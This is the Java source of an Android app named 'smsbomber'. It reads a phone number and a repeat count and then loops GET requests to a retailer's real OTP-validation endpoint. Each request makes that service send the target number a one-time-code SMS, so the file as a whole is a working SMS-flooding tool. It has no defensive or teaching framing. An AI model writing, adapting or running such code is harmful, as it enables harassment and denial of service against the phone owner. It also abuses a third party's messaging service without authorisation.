package com.example.smsbomber;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity  implements View.OnClickListener {

    private EditText editTex1,editText2;
    private TextView textView1,textView2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        editTex1=findViewById(R.id.text1);
        editText2=findViewById(R.id.text2);
        textView1=findViewById(R.id.click);
        textView2=findViewById(R.id.tView);
        textView1.setOnClickListener(this);

        if(isNetworkAvailable()){
            Toast.makeText(MainActivity.this,"Internet Connected",Toast.LENGTH_SHORT);
        }

    }

    @Override
    public void onClick(View v) {

        try {
            if (v.getId()==R.id.click)
            {
                String mobile = editTex1.getText().toString();
                int amount = Integer.parseInt(editText2.getText().toString());
                for(int i=0;i<amount;i++){
                    swapnoApi(mobile);
                }
            }
        }catch (Exception e) {
            textView2.setText("Unsuccessfull");
        }

    }
    private void swapnoApi(String mobile){
        String url = String.valueOf("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+mobile+"&countryPhoneCode=%2B88");
        boolean flag = false;
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // enjoy your response
                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // enjoy your error status
            }
        });
        queue.add(stringRequest);
    }
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
}